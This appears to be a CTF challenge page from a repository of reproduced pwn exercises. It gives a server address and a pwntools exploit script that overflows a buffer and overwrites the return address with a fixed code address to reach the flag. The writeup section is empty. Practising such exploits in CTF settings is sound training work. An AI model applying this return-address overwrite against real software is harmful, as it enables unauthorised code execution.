#### Goals
 * Try to find the flag

#### Server Address
 * nc pwn.sniperoj.com 20000

#### Solution
```python
#!/usr/bin/env python

from pwn import *

context(os='linux', arch='amd64', log_level='debug')

if len(sys.argv) == 3:
    host = sys.argv[1]
    port = int(sys.argv[2])
    Io = remote(host, port)
else:
    Io = process("./pwn")

Io.sendline("1024")
Io.sendline("A")
Io.sendline("B" * 256 + "C" * 24 + p64(0x400806))
Io.sendline("0")

Io.interactive()
```



#### Writeups
 * TODO

## 版权

该题目复现环境尚未取得主办方及出题人相关授权，如果侵权，请联系本人删除（wangyihanger@gmail.com）
